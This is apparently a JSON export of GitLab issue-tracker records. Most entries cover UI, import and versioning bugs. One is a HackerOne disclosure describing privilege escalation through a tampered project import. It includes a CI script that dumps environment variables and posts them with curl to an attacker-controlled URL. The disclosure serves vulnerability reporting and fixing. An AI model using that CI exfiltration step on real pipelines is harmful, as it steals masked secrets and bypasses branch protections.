Sandlin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11222776/avatar.png","web_url":"https://gitlab.com/bsandlin"},"labels":["Category:Pipeline Authoring","SUS::Impacting","UI polish","UX","auto updated","devops::verify","feature::enhancement","frontend","group::pipeline authoring","priority::4","section::ops","severity::4","type::maintenance","usability"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":11222776,"username":"bsandlin","name":"Briley  Sandlin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11222776/avatar.png","web_url":"https://gitlab.com/bsandlin"}],"author":{"id":7536567,"username":"hchouraria","name":"Harsh Chouraria","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7536567/avatar.png","web_url":"https://gitlab.com/hchouraria"},"type":"ISSUE","assignee":{"id":11222776,"username":"bsandlin","name":"Briley  Sandlin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11222776/avatar.png","web_url":"https://gitlab.com/bsandlin"},"user_notes_count":32,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353980","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353980","notes":"https://gitlab.com/api/v4/projects/278964/issues/353980/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353980/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353980","relative":"#353980","full":"gitlab-org/gitlab#353980"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6135,"epic":{"id":285131,"iid":6135,"title":"Mini Pipeline Graph - Making CI Navigation Easier","url":"/groups/gitlab-org/-/epics/6135","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":52750,"iid":66,"sequence":17,"group_id":9970,"title":null,"description":"Target milestone `15.1`","state":3,"created_at":"2022-04-03T00:05:01.955Z","updated_at":"2022-06-13T00:05:02.360Z","start_date":"2022-05-30","due_date":"2022-06-12","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/52750"},"health_status":null},{"id":103870812,"iid":353974,"project_id":278964,"title":"Bump Composition Analysis Analyzer versions for 15.0 release","description":"### Release notes\n\nWe are changing the default version of Java in Dependency Scanning to be 17 as that is [the current Long Term Support (LTS) version](https://en.wikipedia.org/wiki/Java_version_history). We still [support the same versions (8,11,13,14,15,16,17)](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#configuring-specific-analyzers-used-by-dependency-scanning) it is only which is enabled by default that is changing. If you need to change the default to one of the other supported versions set the `DS_Java_Version` variable.\n\nhttps://docs.gitlab.com/ee/user/application_security/dependency_scanning/#configuring-specific-analyzers-used-by-dependency-scanning\n\n### goal\n\nbump up all analyzer versions by one version *just* before the 15.0 release cutoff\n\nno actual real changes other than tag needed\n\n### related changes\n\n- [set python 3.9 as default in gemnasium-python analyzer]](https://gitlab.com/gitlab-org/gitlab/-/issues/335013)\n\n### Implementation plan\n\n- [ ] For each analyzer we should create an MR updating the changelog. Once merged we can create a new release (and the corresponding git tag). \n  - [x] https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium\n  - [x] https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-python\n  - [x] https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven\n  - [x] https://gitlab.com/gitlab-org/security-products/analyzers/license-finder\n- [ ] For each vendored template, update the image to point to the correct major version\n  - [x]  https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Jobs/Dependency-Scanning.gitlab-ci.yml\n  - [x] https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Jobs/License-Scanning.gitlab-ci.yml\n\n\nWe are not bumping bundler-audit and retire.js because we are removing them from 15.0+","state":"closed","created_at":"2022-03-01T07:07:17.337Z","updated_at":"2022-07-13T07:28:16.761Z","closed_at":"2022-05-17T13:00:49.072Z","closed_by":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"labels":["Category:Dependency Scanning","Category:License Compliance","Deliverable","Enterprise Edition","GitLab Ultimate","backend","devops::secure","group::composition analysis","priority::1","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"}],"author":{"id":3913516,"username":"NicoleSchwartz","name":"Nicole Schwartz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3913516/avatar.png","web_url":"https://gitlab.com/NicoleSchwartz"},"type":"ISSUE","assignee":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"user_notes_count":61,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353974","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":6},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"6 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353974","notes":"https://gitlab.com/api/v4/projects/278964/issues/353974/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353974/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353974","relative":"#353974","full":"gitlab-org/gitlab#353974"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":103865008,"iid":353968,"project_id":278964,"title":"[License Compliance MR Widget Extension] - Frontend - Use dedicated API endpoint for collapsed/uncollapsed state","description":"As a follow up to https://gitlab.com/gitlab-org/gitlab/-/issues/338281 we want to optimize the use of the reduced endpoint data to load only the counts for the collapsed state.\n\n\n## UX changes\n\nNone\n\n## Collapsed\n![Screen_Shot_2022-03-14_at_6.24.01_PM](/uploads/c6720ffa4450710bf1db6f6ed039ba46/Screen_Shot_2022-03-14_at_6.24.01_PM.png)\n\n## Uncollapsed\n![Screen_Shot_2022-03-12_at_4.37.54_PM](/uploads/c2fa75132d1338a2240ade691c2bce7c/Screen_Shot_2022-03-12_at_4.37.54_PM.png)\n\n## Summary of change\n\nThe MR widget extension receives two endpoints. One for the collapsed state, and one for the expanded state. We currently use the same endpoint for both. Ideally, we should only load the initial summary version of the data that simply contains the license counts for `new licenses`\n\n## Implementation Plan\n\n- Build on the changes in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75341\n\n- Will need to pass in the new endpoint path all the way from the HAML template in `ee/app/views/projects/merge_requests/show.html.haml` and consume in `ee/app/assets/javascripts/vue_merge_request_widget/stores/mr_widget_store.js` and `ee/app/assets/javascripts/vue_merge_request_widget/extensions/license_compliance/index.js`\n\n- Update `fetchCollapsedData` in `ee/app/assets/javascripts/vue_merge_request_widget/extensions/license_compliance/index.js` to consume counts from new endpoint.\n\n- Ensure both `fetchCollapsedData` and `fetchFullData` to use `pollUntilComplete` to handle 204 status codes while pipeline is running and/or parsing results. For reference use: https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/assets/javascripts/vue_shared/license_compliance/store/actions.js#L90\n\n- Update unit tests\n\n## Testing\n\nFrontend engineer to update unit tests. SET to update Browser level tests to test for collapsed / expanded states.","state":"closed","created_at":"2022-03-01T03:32:12.629Z","updated_at":"2022-05-24T12:04:35.505Z","closed_at":"2022-05-14T06:21:04.916Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["Category:License Compliance","Deliverable","Enterprise Edition","GitLab Ultimate","UX","auto updated","devops::secure","frontend","group::composition analysis","merge request widget","missed-deliverable","missed:14.6","quad-planning::complete-action","section::sec","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"}],"author":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353968","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353968","notes":"https://gitlab.com/api/v4/projects/278964/issues/353968/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353968/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353968","relative":"#353968","full":"gitlab-org/gitlab#353968"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7763,"epic":{"id":476528,"iid":7763,"title":"[MR Widget Eng] - License Compliance MR widget extension migration feature parity with legacy widget","url":"/groups/gitlab-org/-/epics/7763","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"needs_attention"},{"id":103863666,"iid":353966,"project_id":278964,"title":"Environments page - Showing oldest deployment instead of latest","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nOn the Deployments \u003e Environments page: the \"Latest Deployed\" deployment shown for each environment is incorrect, it is showing the oldest deployment instead of showing the latest.\n\nThis has been happening since this page redesign launched (#343584 )\n\n### Steps to reproduce\n\n1. Go to /environments\n2. Unfold one of the environments\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\nThe environment details on the Environments page show the **oldest** successful deployment\n\n### What is the expected *correct* behavior?\n\nThe environment details on the Environments page show the **latest** successful deployment\n\n### Relevant logs and/or screenshots\n\nEnvironments page:\n![image](/uploads/026b781789605fcaf1807e2662503f8e/image.png)  \n\nEnvironment details page for example shown above, showing first page (latest deployment):  \n![image](/uploads/bdf1902faeb67831939b9c8dfe034ad5/image.png)\n\nLast page of deployments on Environment details shows that the oldest successful deployment is the one shown in the environments list page:\n![image](/uploads/18ccd7bf0017c0ed6c222cdf87cc77bf/image.png)\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2022-03-01T02:35:23.956Z","updated_at":"2022-03-15T11:58:55.398Z","closed_at":"2022-03-14T11:48:04.805Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"labels":["Category:Environment Management","Next Up","automation:ml","backend","bug::transient","customer","devops::release","group::release","priority::2","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"}],"author":{"id":1906838,"username":"marc13","name":"Marc Espiard","state":"active","avatar_url":"https://secure.gravatar.com/avatar/01ce46b2c0e1f6a10129f563de8dd12f?s=80\u0026d=identicon","web_url":"https://gitlab.com/marc13"},"type":"ISSUE","assignee":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"user_notes_count":11,"merge_requests_count":0,"upvotes":8,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353966","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353966","notes":"https://gitlab.com/api/v4/projects/278964/issues/353966/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353966/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353966","relative":"#353966","full":"gitlab-org/gitlab#353966"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103861040,"iid":353958,"project_id":278964,"title":"User with developer role (group) can modify Protected branches -\u003e Allowed to merge setting on imported project","description":"**[HackerOne report #1485381](https://hackerone.com/reports/1485381)** by `justas_b` on 2022-02-18, assigned to @nmalcolm:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\nHello,\n\n#####  Summary\n\nA user with developer role (group) can steal masked group/project CI/CD variables by modifying Project settings -\u003e Protected branches -\u003e Allowed to merge setting on imported project (tree/project/protected_branches.ndjson file).\n\n#####  Steps to reproduce\n\n1. Create 2 accounts  \n2. Create a group with account A and masked CI/CD group variables (Group settings -\u003e CI/CD -\u003e Variables)\n\n![secretvar_masked.png](https://h1.sec.gitlab.net/a/e241c857-3140-4311-9538-8e2335b03155/secretvar_masked.png)\n\n3. Create a personal project with account B and export it  \n4. Invite account B (developer) to account A's (owner) group  \n5. With account B, modify the project import file, go to tree/project/protected_branches.ndjson  \n6. Change the \"merge_access_levels\":[{\"access_level\":}] value to 30 if its 40\n\n![merge_access_levels_30.png](https://h1.sec.gitlab.net/a/d5446284-0807-4711-bc00-8995f97416f2/merge_access_levels_30.png)\n\n\n7. Upload the modified project to account A's group with account B  \n8. By default, only maintainers are allowed to merge into protected branches (\"merge_access_levels\":[{\"access_level\":}] is 40 - 40 = maintainer, 30 = developer, etc.)  \n9. Create a new branch with account B (developer)  \n10. Add the following .gitlab-ci.yml file to the newly created branch and create a merge request\n\n```  \nimage: ruby:latest\n\njob_name2:  \n script:  \n   - export \u003e test.txt  \n   - curl -X POST --data \"$(cat test.txt)\" (attacker controlled website's url)  \n```\n\n![new_branch_malicious_gitlab_ci_yml.png](https://h1.sec.gitlab.net/a/6a542336-3c06-461a-94a6-d12d0db49704/new_branch_malicious_gitlab_ci_yml.png)\n\n`[REDACTED]`\n\n11. Merge the newly created branch into main (protected) branch (with account B - developer)\n\n![merge_to_protected_as_developer.png](https://h1.sec.gitlab.net/a/dd5a16d8-c871-4ed2-8a51-16ea9c08281d/merge_to_protected_as_developer.png)\n\n12. A pipeline run against a protected branch will send sensitive data to attackers website using curl\n\n`[REDACTED]`\n\nThe impact is pretty similar to my other report #1256017\n\n#####  What is the current *bug* behavior?\n\nIt is possible to modify the \"merge_access_levels\":[{\"access_level\":} value on imported projects\n\n#####  What is the expected *correct* behavior?\n\nThe \"merge_access_levels\":[{\"access_level\":} should always be default - 40\n\n#####  Relevant logs and/or screenshots\n\n(Paste any relevant logs - please use code blocks (```) to format console output,  \nlogs, and code as it's very hard to read otherwise.)\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nUser with developer role (group) can steal masked group and project CI/CD variables. Developer can also modify main branch without maintainer's permission.\n\n## Attachments\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2022-03-01T00:30:46.307Z","updated_at":"2022-12-13T11:57:13.037Z","closed_at":"2022-05-02T21:57:06.286Z","closed_by":{"id":4226366,"username":"ankelly","name":"Andrew Kelly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4226366/avatar.png","web_url":"https://gitlab.com/ankelly"},"labels":["Category:Importers","HackerOne","Importer:Project Export/Import","Next Up","Weakness::CAPEC-233","backend","bug::vulnerability","devops::manage","estimation::completed","group::import","priority::2","section::dev","security","severity::3","type::bug","workflow::awaiting security release"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"user_notes_count":40,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-05-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353958","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353958","notes":"https://gitlab.com/api/v4/projects/278964/issues/353958/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353958/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353958","relative":"#353958","full":"gitlab-org/gitlab#353958"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3054,"epic":{"id":39522,"iid":3054,"title":"🐞 Project Export/Import bugs","url":"/groups/gitlab-org/-/epics/3054","group_id":9970},"iteration":null,"health_status":null},{"id":103860398,"iid":353952,"project_id":278964,"title":"GitLab Migration - Refreshing the page reverts to default parent group if \"No parent\" was selected","description":"## Summary\n\nWhen using GitLab Group Migration and refreshing the page while a migration is in progress, the selected target parent group is lost. This issue is just cosmetic, as the migration is completed correctly.\n\n## Steps to reproduce\n\n1. Navigate to the Group Migration page (https://gitlab.com/import/bulk_imports/status)\n1. Select \"No parent\" for the destination\n1. Start a migration that takes some time (30s+)\n1. Once the migration shows in progress (\"Importing...\"), refresh the page\n1. Notice that the \"To new group\" (parent) group has been replaced with the default, instead of \"No parent\"\n\nAlso reproduced in this video: https://youtu.be/hxiR-wRUChQ?t=213\n\n## What is the current *bug* behavior?\n\nAfter refresh, \"To new group\" shows the default parent group name.\n\n## What is the expected *correct* behavior?\n\nAfter refresh, \"To new group\" shows \"No parent\".\n\n## Relevant logs and/or screenshots\n\n* https://youtu.be/hxiR-wRUChQ?t=213","state":"closed","created_at":"2022-02-28T23:48:12.665Z","updated_at":"2022-05-06T19:01:15.075Z","closed_at":"2022-05-06T19:01:15.049Z","closed_by":{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"},"labels":["Category:Importers","Importer:GitLab Migration","Next Up","SUS::Impacting","devops::manage","frontend","group::import","milestone::p4","priority::4","section::dev","severity::4","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353952","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353952","notes":"https://gitlab.com/api/v4/projects/278964/issues/353952/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353952/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353952","relative":"#353952","full":"gitlab-org/gitlab#353952"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6629,"epic":{"id":335099,"iid":6629,"title":"🐞 GitLab Migration bugs","url":"/groups/gitlab-org/-/epics/6629","group_id":9970},"iteration":null,"health_status":null},{"id":103860295,"iid":353950,"project_id":278964,"title":"GitLab Migration - Top-level group name not migrated correctly","description":"## Summary\n\nWhen using GitLab Group Migration and migrating groups and subgroups, the top-level group's name is not correctly migrated.\n\n## Steps to reproduce\n\n1. Create a top-level group with subgroups\n1. Give the top-level group a name with capital letters and spaces (i.e. \"My Group\")\n1. Migrate the top-level group using GitLab Group Migration into a top-level group in the destination instance\n1. Notice that the top-level group name has been replaced with the URL path for the group (i.e. \"my-group\")\n\nAlso reproduced in this video: https://youtu.be/hxiR-wRUChQ?t=271\n\n## What is the current *bug* behavior?\n\nThe migrated group name is replaced with the URL path.\n\n## What is the expected *correct* behavior?\n\nThe migrated group name should be preserved (migrated) verbatim.\n\n## Relevant logs and/or screenshots\n\n#### Before migration:\n\n![image](/uploads/094ebca498ebd83c4a80a8bd67787a09/image.png)\n\n#### After Migration:\n\n![image](/uploads/89a7b7a76b09d4252f23f2265e01879f/image.png)\n\n## Additional context\n\nIt is noteworthy that the target group name is explicitly specified when importing a group from a file, while it is expected that it would be copied over when using Group Migration.","state":"closed","created_at":"2022-02-28T23:43:52.738Z","updated_at":"2022-06-14T11:11:12.626Z","closed_at":"2022-05-13T10:00:36.616Z","closed_by":{"id":11342168,"username":"carlad-gl","name":"Carla Drago","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11342168/avatar.png","web_url":"https://gitlab.com/carlad-gl"},"labels":["Category:Importers","Importer:GitLab Migration","Next Up","backend","devops::manage","estimation::completed","group::import","priority::3","section::dev","severity::3","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":null,"user_notes_count":19,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353950","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353950","notes":"https://gitlab.com/api/v4/projects/278964/issues/353950/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353950/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353950","relative":"#353950","full":"gitlab-org/gitlab#353950"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6629,"epic":{"id":335099,"iid":6629,"title":"🐞 GitLab Migration bugs","url":"/groups/gitlab-org/-/epics/6629","group_id":9970},"iteration":null,"health_status":null},{"id":103854794,"iid":353936,"project_id":278964,"title":"GitHub Importer - Default to the current group when importing from GitHub","description":"## Problem to Solve\n\nWhen importing a project from GitHub by clicking the `New project` button, when I arrive on the page with the list of GitHub projects to select, the default group in the \"To GitLab\" column is my personal namespace and not the namespace of the group where I initiated the import flow.\n\nThis is confusing and it may lead to company projects being created in the employees' personal namespaces. \n\n![image](/uploads/e2a0b72baef46f9fc5c04c18eb643b84/image.png)\n\n![image](/uploads/e8377a601ed8272e6fafc4c0f7d17132/image.png)\n\nThis flow can be observed in [this video](https://youtu.be/UHdvPiRBT6o?t=173).\n\n## Proposed Solution\n\nOn the GitHub Importer page, default the destination group to the namespace from which the `New project` button was selected. \n\nThis already works for creating blank new projects and importing GitLab projects from an export file. The way this seems to work for new projects, for example is that the URL loaded after selecting the `New project` button contains the namespace, i.e. `https://gitlab.com/projects/new?namespace_id=9970`.\nFrom there, the \"Create blank project\" page has this URL - `https://gitlab.com/projects/new?namespace_id=9970#blank_project`. However, the GitHub Importer does not carry that parameter - 